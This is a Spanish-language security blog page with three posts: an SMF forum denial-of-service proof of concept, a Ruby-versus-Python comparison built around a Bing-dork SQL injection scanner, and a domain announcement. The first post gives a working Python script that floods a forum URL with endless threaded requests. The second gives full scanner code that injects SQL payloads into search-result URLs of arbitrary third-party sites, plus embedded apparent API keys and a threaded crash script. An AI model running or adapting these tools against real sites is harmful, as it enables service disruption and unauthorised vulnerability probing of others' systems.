
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Security Signal</title>
  <meta name="author" content="q3rv0 - hdbreaker">

  
  <meta name="description" content="by hdbreakerEn esta entrada les quiero compartir una curiosidad que he descubierto ya hace algún tiempo en este famoso gestor de contenidos que &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://securitysignal.github.io/posts/3/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Lobster" rel="stylesheet" type="text/css">

  

</head>

<body>
  <header role="banner"><hgroup>
  <h1><a href="/">Security Signal</a></h1>
  
    <h2>Looking for signs of insecurity...</h2>
  
</hgroup>

</header>
  <div id="navigation">
    <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:securitysignal.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  </div>
  <div id="body"  >
    <div id="main">
      <div id="content">
        <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/02/05/smf-enhancer-of-views-dos/">SMF DoS && Enhancer of Views</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-02-05T02:24:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://www.smf-indonesia.co.id/wp-content/uploads/event/SMF_LOGO.gif" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.smf-indonesia.co.id/wp-content/uploads/event/SMF_LOGO.gif" height="296" width="640" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: left;"><br />En esta entrada les quiero compartir una curiosidad que he descubierto ya hace algún tiempo en este famoso gestor de contenidos que muchos foros utilizan.<br /><a name='more'></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">El mismo en todas sus versiones no valida la IP del usuario al momento de visitar su contenido, pudiendo de esta forma lograr un incremento radical en la cantidad de visitas que puede tener una publicación, pudiendo utilizar la misma para ingeniería social o ataques de Denegación de Servicios.</div><div style="text-align: left;"></div><div style="text-align: left;"><u><b>PoC:</b></u></div><div style="text-align: left;">&nbsp; </div><pre class="brush: py">import requests<br />import threading<br />import sys<br /><br />class Main():<br />  def call(self,i,url):<br />    print i<br />    requests.get(url)<br /><br /><br />  def D0S(self,url):<br />      counter = 0<br />      while True:<br />        counter = counter + 1<br />        try:<br />            t = threading.Thread(target=self.call,args=(counter,url))<br />            t.start()<br />        except:<br />            t.join()<br /><br />if(len(sys.argv)&gt;=2):<br />    init = Main()<br />    init.D0S(sys.argv[1])<br />else:<br />    print "Usage: python exploit.py [URL]"</pre><br /><div class="separator" style="clear: both; text-align: center;"><br /></div>Imagen del contador de visitas antes de la prueba:<br /><br /><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-qXLY0GbcQ38/VNND1cHCqMI/AAAAAAAAAFo/LgFEB-z1CS4/s1600/re1.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-qXLY0GbcQ38/VNND1cHCqMI/AAAAAAAAAFo/LgFEB-z1CS4/s1600/re1.png" height="24" width="640" /></a></div><br />Luego de Explotar:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-4Ys5oJknWGE/VNNEEcvDhcI/AAAAAAAAAFw/n9a8MyfkRU4/s1600/re2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-4Ys5oJknWGE/VNNEEcvDhcI/AAAAAAAAAFw/n9a8MyfkRU4/s1600/re2.png" height="26" width="640" /></a></div><div style="text-align: center;"><br /></div>Al poco tiempo podemos apreciar el DoS:<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-FFlKHSM5FcI/VNNELngOboI/AAAAAAAAAF4/TdlAySs8ZnA/s1600/D0S.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-FFlKHSM5FcI/VNNELngOboI/AAAAAAAAAF4/TdlAySs8ZnA/s1600/D0S.png" height="56" width="640" /></a></div><div style="text-align: center;"><br /></div><br /></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/02/04/ruby-vs-python-same-code/">Ruby vs Python - the Same Code</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-02-04T20:42:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"></div><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://bitboxer.de/images/2012-10-03-ruby-vs-python/ruby-vs-python.png" height="220" width="640" /></div><br /><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: right;"><br /></div><div style="text-align: left;">Bueno en esta entrada, quiero tocar este muy sensible tema dando mi punto de vista sobre ambos lenguajes en base a mi experiencia, por lo que me decidí a portar un proyecto que realice en Python a Ruby para poder compararlos.<br /><br />El proyecto: <b>Scanner de SQL Injection por Bing Dork</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Ambos lenguajes requieren importar librerías externas, ambos tienen repositorios gigantes de librerias llamadas Gemas en Ruby y Modulos en Python<br /><br />Ambos tienen excelentes <b>PackageManagers</b>&nbsp; para cumplir el requisitos de instalación y gestión de librerías y dependencias, por su lado Ruby tiene a <b>bundler</b> y Python tiene <b>pip</b>.</div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"><br />Comparemos!<br /><br /><u><b>Las dependencias:</b></u><br /><br /><b>Ruby:&nbsp;</b></div><div style="text-align: left;"></div><div style="text-align: left;"><br /></div><pre class="brush: ruby">require 'searchbing'<br />require 'unirest'<br />require 'nokogiri'<br />require 'colorize'<br /></pre><br /><div style="text-align: left;"><b>Python:</b><br /><br /><pre class="brush: py">import urllib2<br />import html2text<br />import json<br />import random<br />from colorama import Fore, Back, Style,init<br /></pre><br />La&nbsp; única diferencia entre ambos lenguajes es que python&nbsp; depende del modulo 'json' para lograr parsear la respuesta de Bing. Colorize y Colorama son los encargados de darle color a nuestras salidas de consola<br /><br /><u><b>Las Clases: </b></u><br /><br /><b>Ruby:</b><br /><br /><pre class="brush: ruby">class Main&nbsp;&nbsp;<br />  #Code Here<br />end </pre></div><div style="text-align: left;"><br /></div><b>Python:</b><br /><br /><pre class="brush: ruby">class Main():<br />&nbsp; #Code Here</pre><br />En esto la verdad, que no encuentro diferencia entre ambos lenguajes. Uno usa el bloque end y el otro Indentación<br /><br /><u><b>Inicialización:</b></u><br /><br /><b>Ruby:</b><br /><br /><pre class="brush: ruby">def initialize()<br />    @regExp = ['sql','mysql','fetch_array()','sql error', 'mysql','you have an error in your sql','division by zero in','supplied argument is not a valid mysql result resource in','call to a member function','microsoft jet database','odbc microsoft access driver','microsoft ole db provider for sql server','unclosed quotation mark','microsoft ole db provider for oracle','incorrect syntax near','microsoft jet database engine error','sql query failed','mdb2 error','server error','sql command','403 forbidden','warning: mysql_query','warning: mysql_fetch_row','warning: mysql_fetch_assoc','warning: mysql_fetch_object','warning: mysql_numrows','warning: mysql_num_rows','warning: mysql_fetch_array','warning: pg_connect','supplied argument is not a valid postgresql result','postgresql query failed: error: parser: parse error','mysql error','mysql odbc','mysql driver','supplied argument is not a valid mysql result resource','on mysql result index','oracle odbc','oracle error','oracle driver','oracle db2','microsoft jet database engine error','adodb\.command','adodb\.field error','microsoft access driver','microsoft vbscript runtime error','microsoft vbscript compilation error','microsoft ole db provider for sql server error','ole\/db provider returned message','ole db provider for odbc','odbc sql','odbc db2','oracle error','oracle driver','oracle db2','ole db provider for odbc','odbc sql','odbc db2','odbc driver','odbc error','odbc microsoft access','odbc oracle','jdbc sql','jdbc oracle','jdbc mysql','jdbc error','jdbc driver','invision power board database error','db2 odbc','db2 error','db2 driver','error in your sql syntax','unexpected end of sql command','invalid query','sql command not properly ended','error converting data type varchar to numeric','an illegal character has been found in the statement','active server pages error','asp\.net_sessionid','asp\.net is configured to show verbose error messages','a syntax error has occurred','ora-01756','error executing database query','unclosed quotation mark','bof or eof','getarray','fetchrow','input string was not in a correct format','warning: include','warning: require_once','function\.include','disallowed parent path','function\.require','warning: main','warning: session_start','warning: getimagesize','warning: mysql_result','warning: pg_exec','warning: array_merge','warning: preg_match','incorrect syntax near','ora-00921: unexpected end of sql command','warning: ociexecute','warning: ocifetchstatement','error ora-/i']<br />end<br /></pre><br /><b><br />Python:</b><br /><br /><pre class="brush: py">def __init__(self):<br />        self.arrayErrors = ['sql','mysql','fetch_array()','sql error', 'mysql','you have an error in your sql','division by zero in','supplied argument is not a valid mysql result resource in','call to a member function','microsoft jet database','odbc microsoft access driver','microsoft ole db provider for sql server','unclosed quotation mark','microsoft ole db provider for oracle','incorrect syntax near','microsoft jet database engine error','sql query failed','mdb2 error','server error','sql command','403 forbidden','warning: mysql_query','warning: mysql_fetch_row','warning: mysql_fetch_assoc','warning: mysql_fetch_object','warning: mysql_numrows','warning: mysql_num_rows','warning: mysql_fetch_array','warning: pg_connect','supplied argument is not a valid postgresql result','postgresql query failed: error: parser: parse error','mysql error','mysql odbc','mysql driver','supplied argument is not a valid mysql result resource','on mysql result index','oracle odbc','oracle error','oracle driver','oracle db2','microsoft jet database engine error','adodb\.command','adodb\.field error','microsoft access driver','microsoft vbscript runtime error','microsoft vbscript compilation error','microsoft ole db provider for sql server error','ole\/db provider returned message','ole db provider for odbc','odbc sql','odbc db2','oracle error','oracle driver','oracle db2','ole db provider for odbc','odbc sql','odbc db2','odbc driver','odbc error','odbc microsoft access','odbc oracle','jdbc sql','jdbc oracle','jdbc mysql','jdbc error','jdbc driver','invision power board database error','db2 odbc','db2 error','db2 driver','error in your sql syntax','unexpected end of sql command','invalid query','sql command not properly ended','error converting data type varchar to numeric','an illegal character has been found in the statement','active server pages error','asp\.net_sessionid','asp\.net is configured to show verbose error messages','a syntax error has occurred','ora-01756','error executing database query','unclosed quotation mark','bof or eof','getarray','fetchrow','input string was not in a correct format','warning: include','warning: require_once','function\.include','disallowed parent path','function\.require','warning: main','warning: session_start','warning: getimagesize','warning: mysql_result','warning: pg_exec','warning: array_merge','warning: preg_match','incorrect syntax near','ora-00921: unexpected end of sql command','warning: ociexecute','warning: ocifetchstatement','error ora-/i'];</pre><br /><br />Ambos lenguajes tienen su propia syntaxis para los constructores de clases<br /><br /><u><b>Funciones:</b></u><br /><br /><b>Ruby:</b><br /><br /><pre class="brush: ruby">def randomKeys()<br />        index = Random.rand(0...4);<br />        keys = ['lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','+A2dPS2Q+zU6V77Y+MgzyyJfozHevgViEMmJj4db2VE','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I'];<br />        return keys[index];<br />end<br /></pre><br /><b>Python:</b><br /><br /><pre class="brush: py">def randomKeys(self):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index = random.randrange(1,5);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; keys = ['lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','+A2dPS2Q+zU6V77Y+MgzyyJfozHevgViEMmJj4db2VE','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I'];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return keys[index];<br /><br /></pre><br />Uff me asusta lo similar de estas 2 funciones, la verdad que no encuentro mayores diferencias.<br /><br />Códigos Completos:<br /><br /><b>Ruby:</b><br /><pre class="brush: ruby">require 'searchbing'<br />require 'unirest'<br />require 'nokogiri'<br />require 'colorize'<br /><br />class Main<br /><br />  def initialize()<br />    @regExp = ['sql','mysql','fetch_array()','sql error', 'mysql','you have an error in your sql','division by zero in','supplied argument is not a valid mysql result resource in','call to a member function','microsoft jet database','odbc microsoft access driver','microsoft ole db provider for sql server','unclosed quotation mark','microsoft ole db provider for oracle','incorrect syntax near','microsoft jet database engine error','sql query failed','mdb2 error','server error','sql command','403 forbidden','warning: mysql_query','warning: mysql_fetch_row','warning: mysql_fetch_assoc','warning: mysql_fetch_object','warning: mysql_numrows','warning: mysql_num_rows','warning: mysql_fetch_array','warning: pg_connect','supplied argument is not a valid postgresql result','postgresql query failed: error: parser: parse error','mysql error','mysql odbc','mysql driver','supplied argument is not a valid mysql result resource','on mysql result index','oracle odbc','oracle error','oracle driver','oracle db2','microsoft jet database engine error','adodb\.command','adodb\.field error','microsoft access driver','microsoft vbscript runtime error','microsoft vbscript compilation error','microsoft ole db provider for sql server error','ole\/db provider returned message','ole db provider for odbc','odbc sql','odbc db2','oracle error','oracle driver','oracle db2','ole db provider for odbc','odbc sql','odbc db2','odbc driver','odbc error','odbc microsoft access','odbc oracle','jdbc sql','jdbc oracle','jdbc mysql','jdbc error','jdbc driver','invision power board database error','db2 odbc','db2 error','db2 driver','error in your sql syntax','unexpected end of sql command','invalid query','sql command not properly ended','error converting data type varchar to numeric','an illegal character has been found in the statement','active server pages error','asp\.net_sessionid','asp\.net is configured to show verbose error messages','a syntax error has occurred','ora-01756','error executing database query','unclosed quotation mark','bof or eof','getarray','fetchrow','input string was not in a correct format','warning: include','warning: require_once','function\.include','disallowed parent path','function\.require','warning: main','warning: session_start','warning: getimagesize','warning: mysql_result','warning: pg_exec','warning: array_merge','warning: preg_match','incorrect syntax near','ora-00921: unexpected end of sql command','warning: ociexecute','warning: ocifetchstatement','error ora-/i']<br />  end<br /><br />  def randomKeys()<br />    index = Random.rand(0...4);<br />    keys = ['lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','+A2dPS2Q+zU6V77Y+MgzyyJfozHevgViEMmJj4db2VE','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I'];<br />    return keys[index];<br />  end<br /><br />  def Search()<br />    urls = []<br />    print "Bing Dork: "<br />    dork = gets().chomp()<br />    bingSearch = Bing.new(randomKeys(), 99999, 'Web')<br />    results = bingSearch.search(dork)<br />    results[0][:Web].each { |res|<br />      urls.push(res[:Url])<br />    }<br />    isVulnerable(urls)<br />  end<br /><br />  def export(vulnUrls)<br /><br />    vulnUrls.each { |url|<br />      File.open("./vulnerable.txt", 'a') { |file| file.write(url+"\n") }<br />    }<br /><br />  end<br /><br />  def isVulnerable(urls)<br />    vulnerables = []<br />    vectores=['=\'','="', '=-999', '=169 order by 100-- -c']<br /><br />    urls.each { |url|<br />      vectores.each { |vector|<br />        injectedUrl=url.gsub("=",vector)<br />        request = Unirest.get(injectedUrl)<br />        responseTxt = Nokogiri::HTML(request.body).text<br />        @regExp.each { |error|<br />          begin<br />            if (responseTxt =~/#{error}/)<br />              puts "Vulnerable =&gt; ".red + injectedUrl.red<br />              vulnerables.push(injectedUrl)<br />              break<br />            else<br />              puts "Not Vulnerable =&gt; ".green + injectedUrl.green<br />              break<br />            end<br />          rescue<br />            break<br />          end<br />        }<br />      }<br />    }<br /><br />    export(vulnerables)<br />    puts "\n*******************************************"<br />    puts "*****************FINISH********************"<br />    puts "*******************************************"<br /><br />  end<br /><br />end<br /><br />if(ARGV.length&gt;=1)<br />  ARGV.each { |arg|<br />    if(arg=="--vulnerable")<br />      File.open("./vulnerable.txt", 'r') { |file| puts file.readlines()}<br />    end<br />  }<br />else<br />  main = Main.new()<br />  main.Search()<br />end<br /><br /></pre><br /><br /><br /><b>Python:</b><br /><br /><pre class="brush: py"># -*- coding: utf-8 -*-<br />import urllib2<br />import html2text<br />import json<br />import random<br />import sys;<br />import os;<br />from colorama import Fore, Back, Style<br />from colorama import init<br />init()<br />class Main():<br /><br />    def __init__(self):<br />        self.arrayErrors = ['sql','mysql','fetch_array()','sql error', 'mysql','you have an error in your sql','division by zero in','supplied argument is not a valid mysql result resource in','call to a member function','microsoft jet database','odbc microsoft access driver','microsoft ole db provider for sql server','unclosed quotation mark','microsoft ole db provider for oracle','incorrect syntax near','microsoft jet database engine error','sql query failed','mdb2 error','server error','sql command','403 forbidden','warning: mysql_query','warning: mysql_fetch_row','warning: mysql_fetch_assoc','warning: mysql_fetch_object','warning: mysql_numrows','warning: mysql_num_rows','warning: mysql_fetch_array','warning: pg_connect','supplied argument is not a valid postgresql result','postgresql query failed: error: parser: parse error','mysql error','mysql odbc','mysql driver','supplied argument is not a valid mysql result resource','on mysql result index','oracle odbc','oracle error','oracle driver','oracle db2','microsoft jet database engine error','adodb\.command','adodb\.field error','microsoft access driver','microsoft vbscript runtime error','microsoft vbscript compilation error','microsoft ole db provider for sql server error','ole\/db provider returned message','ole db provider for odbc','odbc sql','odbc db2','oracle error','oracle driver','oracle db2','ole db provider for odbc','odbc sql','odbc db2','odbc driver','odbc error','odbc microsoft access','odbc oracle','jdbc sql','jdbc oracle','jdbc mysql','jdbc error','jdbc driver','invision power board database error','db2 odbc','db2 error','db2 driver','error in your sql syntax','unexpected end of sql command','invalid query','sql command not properly ended','error converting data type varchar to numeric','an illegal character has been found in the statement','active server pages error','asp\.net_sessionid','asp\.net is configured to show verbose error messages','a syntax error has occurred','ora-01756','error executing database query','unclosed quotation mark','bof or eof','getarray','fetchrow','input string was not in a correct format','warning: include','warning: require_once','function\.include','disallowed parent path','function\.require','warning: main','warning: session_start','warning: getimagesize','warning: mysql_result','warning: pg_exec','warning: array_merge','warning: preg_match','incorrect syntax near','ora-00921: unexpected end of sql command','warning: ociexecute','warning: ocifetchstatement','error ora-/i'];<br /><br />    def randomKeys(self):<br />        index = random.randrange(1,5);<br />        keys = ['lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','+A2dPS2Q+zU6V77Y+MgzyyJfozHevgViEMmJj4db2VE','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I'];<br />        return keys[index];<br /><br />    def Search(self,query, search_type):<br />        #search_type: Web, Image, News, Video<br />        key = self.randomKeys()<br />        query = urllib2.quote(query)<br />        # create credential for authentication<br />        user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)'<br />        credentials = (':%s' % key).encode('base64')[:-1]<br />        auth = 'Basic %s' % credentials<br />        url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/'+search_type+'?Query=%27'+query+'%27&amp;$top=100&amp;$format=json'<br />        request = urllib2.Request(url)<br />        request.add_header('Authorization', auth)<br />        request.add_header('User-Agent', user_agent)<br />        request_opener = urllib2.build_opener()<br />        response = request_opener.open(request)<br />        response_data = response.read()<br />        json_result = json.loads(response_data)<br />        urls = [res['Url'] for res in json_result['d']['results']]<br />        return urls<br /><br />    def export(self, vulnUrls):<br />        f = open("vulnerable.txt","a");<br />        f.writelines(vulnUrls + " is vulnerable" + '\n');<br />        f.close();<br /><br />    def isVulnerable(self,arrayUrl):<br />        vulnerables = []<br />        vectores=['=\'','=\"', '=-999', '=169 order by 100-- -c'];<br />        for url in arrayUrl:<br />            Url = ""+url;<br />            for vector in vectores:<br />                Url2 = Url.replace("=",vector);<br />                try:<br />                    response = ""+urllib2.urlopen(Url2).read();<br />                    page = html2text.html2text(response.decode('utf-8',errors='ignore'));<br /><br />                    contenido = page.lower();<br /><br />                    for error in self.arrayErrors:<br />                         if(contenido.find(error) &gt; -1):<br />                            print (Fore.RED + Url2 + " is vulnerable");<br />                            vulnerables.append(Url2)<br />                            break<br />                         else:<br />                            print (Fore.GREEN + Url2 + " is not vulnerable");<br />                            break<br /><br /><br /><br />                except:<br />                    print(Fore.GREEN + "Ups han error ocurred with this page!");<br /><br />        self.export(vulnerables)<br />        print "\n*******************************************"<br />        print "*****************FINISH********************"<br />        print "*******************************************"<br /><br /><br />if (len(sys.argv)&gt;= 2) and (sys.argv[1] == "--vulnerable") and (os.path.exists("vulnerable.txt")):<br />    f = open("vulnerable.txt")<br />    for lines in f:<br />        print (Fore.RED + lines.replace('\n',''));<br />else:<br />    print("*Bing Dork Exampĺe: 'Domain:.ar galeria.php?id=1'");<br />    var = raw_input("Ingrese Bing Dork: \n");<br />    main = Main()<br />    urls = main.Search(var,'Web')<br />    URLS = []<br />    for url in urls:<br />        URLS.append(url);<br />    main.isVulnerable(URLS);<br /><br /></pre><u><b>Conclusión:</b></u><br /><br />Realmente no comprendo de donde viene la disputa entre ambos lenguajes, creo que ambos son primos hermanos, comparten diferencias minimas de sintaxis, ambos son interpretados, ambos son sumamente flexibles, ambos tienen una curva de aprendizaje minima, ambos son en exceso poderosos. Ambos lenguajes son recomendados para todo programador experimentado como novato. Además portar código de uno al otro es sumamente fácil.<br /><br />Creo dar un punto de vista objetivo y técnico, comparando sus bloques estructurales, me saco la camiseta de Python y digo que ambos lenguajes son sumamente interesantes y poderosos. Creo que mucha gente se casa con un lenguaje y se olvida de que un lenguaje de programación es una herramienta.<br /><br />Cabe resaltar que como todo lenguaje tienen sus características propias y su propia sintaxis para bloques como <b>foreach</b>. Pero ningún lenguaje es limintante, y no se puede decir que con Python vas a poder hacer cosas que con Ruby no ni viceversa.<br /><b><br /></b>La diferencia mas importante que pude notar, es que Ruby trabaja con variables Locales, de Clase y Globales, mientras que en python todas las variables son globales. Siendo un programador JAVA puedo decir que me parece una forma mas correcta y segura de tratar las variales que Python.<br /><br /><b>Un punto en contra</b> para Ruby es que a la fecha&nbsp; tiene un problema al gestionar multiples hilos junto a peticiones http, dando como resultado un posible segmentation fault:<span style="color: red;"> <b>rb_sys_fail(getaddrinfo)</b></span><br /><br />He realizado un pequeñó script que logra demostrar el fallo que afecta a las versiones 1.9.3, 2.2.0 y probablemente a las versiones estables anteriores de Ruby<br /><br /><u><b>PoC:</b></u><br /><br /><pre class="brush: ruby">require 'unirest' #require 'net/http' for 1.9.3<br /><br />class Main<br /><br />  def call()<br />    Unirest.get("http://www.like4like.org/") <br />    #For 1.9.3<br />    #uri = URI('http://example.com/index.html?count=10')    <br />    #Net::HTTPget(uri)  <br />  end<br /><br />  def D0S()<br />    threads = (1..99999).map { |i|<br />      Thread.new(i){<br />        call()<br />      }<br />    }<br />    threads.each {|t| t.join}<br />  end<br /><br />end<br /><br />init = Main.new()<br />init.D0S()</pre><b></b><br /><b><u>Salida:</u></b> #full stack trace <a href="http://pastebin.com/0UpHZh53">http://pastebin.com/0UpHZh53</a><b> </b><br /><b></b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-lXw8t-q7dCM/VNMze4T5uRI/AAAAAAAAATY/VaTJhSglvr0/s1600/stack.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-lXw8t-q7dCM/VNMze4T5uRI/AAAAAAAAATY/VaTJhSglvr0/s1600/stack.png" height="194" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Si seguimos el stack trace, llegamos a la linea donde se produce el error:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-S-wIhi5dR6U/VNM0TOjXh1I/AAAAAAAAATg/Ks5gesJAtZQ/s1600/stackerror.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-S-wIhi5dR6U/VNM0TOjXh1I/AAAAAAAAATg/Ks5gesJAtZQ/s1600/stackerror.png" height="86" width="640" /></a></div><div style="text-align: center;"><br /></div><pre class="brush: ruby">TCPSocket.open(conn_address, conn_port, @local_host, @local_port) #Aqui el error </pre><br /><br />Al ser la descripcion del error <span style="color: red;"><b>rb_sys_fail(getaddrinfo)</b></span> podemos deducir que el problema se presenta al intentar obtener cierta informacion del sitio/dominio a solicitar.<br /><br />Como curiosidad <b>sin confirmar</b>, es posible de que este error pueda utilizarse para explotar el novedoso bug <a href="http://lamiradadelreplicante.com/2015/01/28/ghost-grave-vulnerabilidad-que-permitiria-el-control-de-sistemas-linux/">GHOST CVE-2015-0235</a>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-1bX-EGFIGgk/VNM2NpHcUNI/AAAAAAAAATs/tjkcgTN_OYA/s1600/Note.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-1bX-EGFIGgk/VNM2NpHcUNI/AAAAAAAAATs/tjkcgTN_OYA/s1600/Note.png" height="88" width="640" /></a></div><div style="text-align: center;"><br /></div>Por suerte el fallo ya ha sido reportado y los desarrolladores de Ruby se encuentran buscando una solución.<br /><br />Reporte:<br /><a href="https://bugs.ruby-lang.org/issues/9697">https://bugs.ruby-lang.org/issues/9697</a><br /><b></b><br /><b><br /></b><u><b>Equivalencias:</b></u><br /><br /><b>Ruby</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>=&gt;</b>&nbsp;&nbsp;&nbsp;&nbsp; <b>Python</b><br /><br />unirest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; urlib2 #requets  <br />nokogiri&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; html2text <br />colorize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; colorama  <br /><br />array.push()&nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; array.append()&nbsp; <br />urls.each&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; for item in array: <br />puts&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; print   </div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/02/04/securitysigalorg/">SecuritySignal.org</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-02-04T18:16:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://cdn1.hubspot.com/hub/149308/file-31060313.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://cdn1.hubspot.com/hub/149308/file-31060313.jpg" height="440" width="640" /></a></div><div style="text-align: left;">Queremos anunciar que próximamente mudaremos nuestro dominio a:<a href="http://www.securitysignal.org/"> http://www.securitysignal.org</a></div><div style="text-align: left;">Esto ha sido posible gracias a la colaboración de <b>Imparable Fenix</b>.<br /><a name='more'></a><div style="text-align: center;"><br /><b>Es muy importante para nosotros que la comunidad nos ayude a crecer.</b></div><br />SecuritySignal apoya el "Conocimiento Libre", pero queremos recordar que nuestro equipo realiza un gran esfuerzo para redactar material de calidad, lo que implica horas de trabajo, traducción de material en ingles e inclusive la compra de material escrito y hardware para estudiar.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><div style="text-align: center;"><b>Por favor, si son lectores habituales de nuestro sitio, si les gusta nuestro trabajo o simplemente quieren ayudarnos a crecer colaboren con SecuritySignal.</b></div><br />Una colaboración no necesariamente es económica, puedes ponerte en contacto con nosotros y colaborar con servicios, material o inclusive hardware para nuevas investigaciones.<br /><br />Todo aquel que colabore con SecuritySignal obtendrá una mención en nuestra pagina de <a href="http://www.securitysignal.tk/p/sponsors.html">Sponsors</a>, dependiendo el grado de la colaboración se agregará un 